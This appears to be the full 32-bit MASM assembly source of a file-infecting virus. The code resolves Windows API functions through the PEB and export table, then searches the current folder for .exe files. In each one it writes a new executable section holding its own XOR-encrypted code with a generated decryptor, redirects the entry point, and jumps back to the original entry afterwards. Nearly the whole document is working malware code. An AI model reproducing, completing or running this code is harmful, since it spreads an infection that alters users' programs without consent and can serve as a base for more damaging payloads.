; inject.asm

.386
.model flat, stdcall
assume fs:nothing

option casemap:none

include		\masm32\include\windows.inc
include		\masm32\include\user32.inc
include		\masm32\include\kernel32.inc
include		\masm32\include\msvcrt.inc


; Source of life
; Macro to avoid repetition when pushing offset with delta
PDELTA		macro	Addr
			mov	eax, offset Addr
			add	eax, ebp
			push	eax
		endm
; Macro to avoid repetition when pushing offset value with delta
PVDELTA		macro	Addr
			mov	eax, offset Addr
			add	eax, ebp
			push	[eax]
		endm
; If we change our mind on ebp
DELTA		equ	ebp + offset
; Such wow
GETADDR		macro	Name, Lib, Save
			PDELTA	Name
			push	[DELTA Lib]
			call	[DELTA pGetProcAddress]
			mov	[DELTA Save], eax
		endm


.code

toInject:
; Decrypter
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

endDecrypter:
; Replace the Jmp from the EP do the old data 
nop
nop
nop
nop
nop

; Jmp data
jmp	start

; FILE
FileData		WIN32_FIND_DATA	<>
DebugDone		db		"Done", 0 ; TODO remove
SearchFolder		db		"*.exe", 0
HandleSearch		dd		?
NewSectionName		db		"ImIn", 0

; PE
BaseImage		dd	?
OldEntryPoint		dd	?
PeFile			dd	?
PeMapObject		dd	?
PeFileMap		dd	?
PeSectionNb		dd	?
PeNtHeader		dd	?
PeOptionalHeader	dd	?
LastSecHeader		dd	?
LastSec			dd	?
PeStartHeader		dd	?
SectionAlignment	dd	?
FileAlignment		dd	?
NewSectionCodeSize	dd	?
VirtualAddress		dd	?
SizeOfRawData		dd	?
PointerToRawData	dd	?

; DLL
sCreateFileMapping	db	'CreateFileMappingA', 0 
sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
sGetSystemTime	db	'GetSystemTime', 0
sExitProcess	db	'ExitProcess', 0 
sCreateFile	db	'CreateFileA', 0 
sMapViewOfFile	db	'MapViewOfFile', 0 
sCloseHandle	db	'CloseHandle', 0 
sWriteFile	db	'WriteFile', 0 
sGetProcAddress	db	'GetProcAddress', 0 
sMessageBox	db	'MessageBoxA', 0 
sLoadLibrary	db	'LoadLibraryA', 0 
sFindFirstFile	db	'FindFirstFileA', 0
sFindNextFile	db	'FindNextFileA', 0
sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
sUser32		db	'USER32.DLL', 0
sKernel32	db	'KERNEL32.DLL', 0
pCreateFileMapping	dd	?
pUnmapViewOfFile	dd	?
pGetSystemTime	dd	?
pExitProcess	dd	?
pCreateFile	dd	?
pMapViewOfFile	dd	?
pCloseHandle	dd	?
pWriteFile	dd	?
pMessageBox	dd	?
pKernel32	dd	?
pUser32		dd	?
pLoadLibrary	dd	?
pGetProcAddress	dd	?
pFindFirstFile	dd	?
pFindNextFile	dd	?

; OTHERS
_SYSTEMTIME	STRUC
Year		dw	?
Month		dw	?
DayOfWeek	dw	?
Day		dw	?
Hour		dw	?
Minute		dw	?
Second		dw	?
Milliseconds	dw	?
_SYSTEMTIME	ENDS
STime		_SYSTEMTIME	<>


; TODO
; Seek TODO

start:
; Delta offset for PIC
call	delta
delta:
pop	ebp ; Retrieve eip
sub	ebp, delta ; Ebp + Label to get the data

; GETTING KERNEL32 FUNCTIONS
; GET BASE ADDRESS OF KERNEL32
xor 	ebx, ebx
mov 	ebx, fs:[030h] ; PEB
mov 	ebx, [ebx + 0Ch] ; PEB_LDR
mov 	ebx, [ebx + 014h] ; LBR 1st
mov 	ebx, [ebx] ; 2nd entry
mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
mov	[DELTA pKernel32], ebx

; GET PROPERTIES DLL
mov	esi, [ebx + 03Ch] ; PE Header offset
add	esi, ebx
mov	esi, [esi + 078h] ; Export table offset
add	esi, ebx
mov	edi, [esi + 020h] ; Export Name Table offset
add	edi, ebx
mov	ecx, [esi + 014h] ; Number of functions

; LOOP FROM FUNCTIONS AND GET LoadLibrary & GetProcAddress
mov	eax, ebp
add	eax, offset sGetProcAddress
mov	edx, eax ; Search function
xor	eax, eax ; Counter
checkFunctionName:
mov	ecx, [edi] ; Function name offset
add	ecx, ebx
pusha ; Keep register
call	strcmp
test	eax, eax
popa
jz	functionFound
add	edi, 4 ; Get next function name
inc	eax
jmp	checkFunctionName ; I will find you
functionFound:
mov	edx, [esi + 01Ch] ; List of entry point
add	edx, ebx
mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
add	edx, ebx
mov	[DELTA pGetProcAddress], edx

; Get User32 (Not without LoadLibrary !)
GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
PDELTA	sUser32
call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
mov	[DELTA pUser32], eax
; GET ALL THE THINGS !
GETADDR	sMessageBox, pUser32, pMessageBox
GETADDR	sExitProcess, pKernel32, pExitProcess
GETADDR	sCreateFile, pKernel32, pCreateFile
GETADDR	sCreateFileMapping, pKernel32, pCreateFileMapping
GETADDR	sMapViewOfFile, pKernel32, pMapViewOfFile
GETADDR	sUnmapViewOfFile, pKernel32, pUnmapViewOfFile
GETADDR	sCloseHandle, pKernel32, pCloseHandle
GETADDR	sWriteFile, pKernel32, pWriteFile
GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
GETADDR	sFindNextFile, pKernel32, pFindNextFile
GETADDR	sGetSystemTime, pKernel32, pGetSystemTime


; INJECT ALL THE FILES !
PDELTA	FileData
PDELTA	SearchFolder
call	[DELTA pFindFirstFile]
cmp	eax, INVALID_HANDLE_VALUE
je	errorExit
mov	[DELTA HandleSearch], eax

; INJECT THE NEXT !
nextFileToInject:
; OPEN FILE
push	0
push	0
push	OPEN_EXISTING
push	0
push	0
mov	eax, GENERIC_READ
or	eax, GENERIC_WRITE
push	eax
PDELTA	FileData.cFileName
call	[DELTA pCreateFile]
cmp	eax, INVALID_HANDLE_VALUE
je	errorOpen
mov	[DELTA PeFile], eax

; CREATE_FILE_MAPPING
push	NULL
push	0
push	0
push	PAGE_READWRITE
push	NULL
PVDELTA	PeFile
call	[DELTA pCreateFileMapping]
cmp	eax, 0
je	errorCreateMapping
mov	[DELTA PeMapObject], eax

; MAP_VIEW_OF_FILE
push	0
push	0
push	0
mov	eax,	FILE_MAP_READ
or	eax,	FILE_MAP_WRITE
push	eax
PVDELTA	PeMapObject
call	[DELTA pMapViewOfFile]
cmp	eax, 0
je	errorMapFile
mov	[DELTA PeFileMap], eax
mov	ebx, eax

; CHECK MAGIC
cmp	word ptr [ebx], IMAGE_DOS_SIGNATURE
jne	errorInjecting


; CHECK IMAGE_NET_SIGNATURE
mov	ecx, ebx
add	ecx, 03Ch
mov	edx, ebx
add	edx, dword ptr [ecx]
mov	[DELTA PeNtHeader], edx
cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
jne	errorInjecting

; GET OPTIONAL HEADER useless so far
mov	[DELTA PeOptionalHeader], edx
add	[DELTA PeOptionalHeader], 018h

; GET NUMBER SECTIONS
mov	eax, edx
add	eax, 6
mov	[DELTA PeSectionNb], eax
xor	ecx, ecx
mov	cx, word ptr[eax]

; GET IMAGE BASE
add	eax, 02Eh
mov	esi, [eax]
mov	[DELTA BaseImage], esi

; GET ALIGNMENT
add	eax, 04h
mov	esi, [eax]
mov	[DELTA SectionAlignment], esi
add	eax, 04h
mov	esi, [eax]
mov	[DELTA FileAlignment], esi


; LOOP SECTIONS HEADER
mov	esi, edx
add	esi, 0F8h
mov	[DELTA PeStartHeader], esi
mov	ebx, esi ; Keep start of Headers
mov	[DELTA LastSec], 0
Loop_SectionHeader:
; GET LAST SECTION
mov	eax, esi
add	eax, 0Ch
cmp	[DELTA LastSec], eax
jg	keepLastSec
mov	[DELTA LastSecHeader], esi
mov	[DELTA LastSec], eax
keepLastSec:
add	esi, 028h
loop	Loop_SectionHeader


; CREATE NEW SECTION HEADER
; COPY FIRST ONE INTO NEW ONE
mov	ecx, 020h
mov	edi, esi ; Destination bytes
mov	esi, [DELTA PeStartHeader] ; Source bytes
mov	ebx, edi ; Keep start of new header
CreateNewHeader:
lodsb
stosb
loop	CreateNewHeader

; INCREMENT NUMBER OF SECTION
xor	eax, eax
mov	edi, [DELTA PeSectionNb]
mov	ax, word ptr [edi]
inc	eax
mov	ecx, [DELTA PeSectionNb]
mov	word ptr [ecx], ax

; COPY THE NAME
mov	ecx, 08h ; Length of Name
mov	esi, offset NewSectionName ; Source bytes
add	esi, ebp
mov	edi, ebx ; Destination bytes
pusha ; Keep registers
CopySectionName:
lodsb
stosb
loop CopySectionName

; Virtual Size
popa	; Retrieve registers
add	edi, 08h
mov	[DELTA NewSectionCodeSize], endInject - toInject ; Size of actual code in new section
mov	ecx, [DELTA NewSectionCodeSize]
mov	[edi], ecx

; Virtual Address
add	edi, 04h
mov	ecx, [DELTA LastSecHeader]
add	ecx, 08h ; LastSecHeader.VirtualSize
mov	eax, [ecx]
add	ecx, 04h ; LastSecHeader.VirtualAdress
mov	ebx, ecx ; Keep VAddress for Raw data
add	eax, [ecx]
; pImageSectionHeader->VirtualAddress = (((EndSections - 1) / SectionAlignment) + 1) * SectionAlignment;
sub eax, 1
xor	edx, edx
div	[DELTA SectionAlignment] ; divide eax by SectionAlignement
add	eax, 1
mul	[DELTA SectionAlignment]
mov	[edi], eax
mov	[DELTA VirtualAddress], eax
mov	esi, eax ; Keep New VA for EntryPoint

; Size of raw data
add	edi, 04h
mov	eax, [DELTA NewSectionCodeSize]
sub	eax, 1
xor	edx, edx
div	[DELTA FileAlignment] ; divide eax by FileAlignment
add	eax, 1
mul	[DELTA FileAlignment]
mov	[edi], eax
mov	[DELTA SizeOfRawData], eax

; Pointer to raw data (Get last section pointer to raw data + size of raw data)
add	edi, 04h
mov	ecx, ebx
add	ecx, 04h
mov	eax, [ecx]
add	ecx, 04h
add	eax, [ecx]
mov	[edi], eax
mov	[DELTA PointerToRawData], eax

; Characteristics
add	edi, 010h
mov	ecx, IMAGE_SCN_MEM_READ
or	ecx, IMAGE_SCN_MEM_WRITE
or	ecx, IMAGE_SCN_MEM_EXECUTE
or	ecx, IMAGE_SCN_CNT_CODE
mov	[edi], ecx


; CHANGE PE PROPERTIES
mov	eax, [DELTA PeNtHeader]
add	eax, 01Ch
; CHANGE ENTRY POINT
add	eax, 0Ch
mov	edi, [eax]
mov	[DELTA OldEntryPoint], edi
mov	[eax], esi
; CHANGE SIZE OF IMAGE
xor	edi, edi
getSizeRawDataAligned:
cmp	[DELTA SizeOfRawData], edi
jl	SizeOfCodeSectionDone
add	edi, [DELTA SectionAlignment]
loop	getSizeRawDataAligned
SizeOfCodeSectionDone:
add	eax, 028h
add	ebx, 08h
add	esi, edi
mov	[eax], esi
; CLOSE
PVDELTA	PeFileMap
call	[DELTA pUnmapViewOfFile]
PVDELTA	PeMapObject
call	[DELTA pCloseHandle]


; CREATE NEW SECTION 
; CREATE_FILE_MAPPING WITH SIZE + INJECT SIZE
push	NULL
mov	eax, [DELTA PointerToRawData]
add	eax, [DELTA SizeOfRawData]
push	eax ; New size
push	0
push	PAGE_READWRITE
push	NULL
PVDELTA	PeFile
call	[DELTA pCreateFileMapping]
cmp	eax, 0
je	errorCreateMapping
mov	[DELTA PeMapObject], eax

; MAP_VIEW_OF_FILE
push	0
push	0
push	0
mov	eax, FILE_MAP_READ
or	eax, FILE_MAP_WRITE
push	eax
PVDELTA	PeMapObject
call	[DELTA pMapViewOfFile]
cmp	eax, 0
je	errorMapFile
mov	[DELTA PeFileMap], eax


; CREATING ENCRYPTER
mov	eax, 255 ; Maximum xoring
call	random
mov	edx, eax

; INSERTING NEW SECTION - OPCODE COPY
mov	ecx, [DELTA SizeOfRawData]
mov	edi, [DELTA PeFileMap] ; Destination bytes
add	edi, [DELTA PointerToRawData]
mov	esi, toInject ; Source bytes
add	esi, ebp
createNewSection:
lodsb
xor	eax, edx ; Encrypt
stosb
loop	createNewSection

; CREATING JUMP TO OLD ENTRY POINT
mov	edi, errorExit - toInject ; Offset jmp
add	edi, [DELTA PeFileMap] ; Add base filemap
add	edi, [DELTA PointerToRawData] ; Add section offset
mov	eax, 0E9h ; Push imm32 OPCODE
xor	eax, edx ; Encrypt
stosb
mov	eax, [DELTA OldEntryPoint] ; Entry point address
sub	eax, [DELTA VirtualAddress]
mov	esi, errorExit - toInject
sub	eax, esi
sub	eax, 05h ; Add 5 bytes for JMP
; Set same byte for all 4 bytes of EDX
rol	edx, 8
mov	dl, dh
rol	edx, 8
mov	dl, dh
rol	edx, 8
mov	dl, dh
xor	eax, edx ; encrypt
stosd

; CREATING DECRYPTER
DECRYPTER_SIZE = 25
mov	edi, [DELTA PeFileMap]
add	edi, [DELTA PointerToRawData]
mov	eax, 0BFh ; Mov edi
stosb
mov	eax, DECRYPTER_SIZE ; Decrypter Size
add	eax, [DELTA BaseImage]
add	eax, [DELTA VirtualAddress] ; Address of our section
stosd
mov	eax, 0F78Bh ; mov esi, edi
stosw
mov	eax, 0C933h ; xor ecx, ecx
stosw
mov	eax, 0ACh ; lodsb opcode
stosb
mov	eax, 035h ; xor opcode
stosb
mov	eax, edx ; random xor
stosd
mov	eax, 0AAh ; stosb
stosb
mov	eax, 041h ; inc ecx
stosb
mov	eax, 0F981h ; cmp ecx
stosw
mov	eax, endInject - toInject - DECRYPTER_SIZE
stosd
mov	eax, 075h ; Je
stosb
mov	eax, -DECRYPTER_SIZE + 9
stosb



; DEBUG FILE INJECTED - TODO REMOVE
push	0
PDELTA	DebugDone
PDELTA	FileData.cFileName
push	0
call	[DELTA pMessageBox]


; MANAGE ALL KINDS OF ERRORS !
errorInjecting:
PVDELTA	PeFileMap
call	[DELTA pUnmapViewOfFile]

errorMapFile:
PVDELTA	PeMapObject
call	[DELTA pCloseHandle]

errorCreateMapping:
PVDELTA	PeFile
call	[DELTA pCloseHandle]

; TO THIS POINT WE GET THE NEXT FILE (IF POSSIBLE)
errorOpen:
PDELTA	FileData
PVDELTA	HandleSearch
call	[DELTA pFindNextFile]
cmp	eax, 0
je	errorExit
jmp	nextFileToInject

; Jump to old entry point (Overrided when injecting)
errorExit:
mov	eax, 042h
mov	eax, 042h
mov	eax, 042h
mov	eax, 042h
mov	eax, 042h
push	0
call 	[DELTA pExitProcess]


; UTILS
; Random number (EAX: Max && Return Value)
random:
push	ecx
push	edx
mov	ecx, eax
pusha
PDELTA	STime
call	[DELTA pGetSystemTime]
popa
xor	eax, eax
mov	ax, word ptr [DELTA STime.Milliseconds]
shl	eax, 16
mov	ax, word ptr [DELTA STime.Second]
xor	edx, edx
div	ecx
mov	eax, edx
pop	edx
pop	ecx
ret

; Compare two strings : ecx/edx (EAX[0]: MATCH)
strcmp:
mov	al, [ecx]
mov	ah, [edx]
cmp	al, ah
jne	nomatch
test	al, al
jz	match
test	ah, ah
jz	match
inc	ecx
inc	edx
jmp	strcmp
match:
xor	eax, eax
nomatch:
ret

endInject:

end		toInject

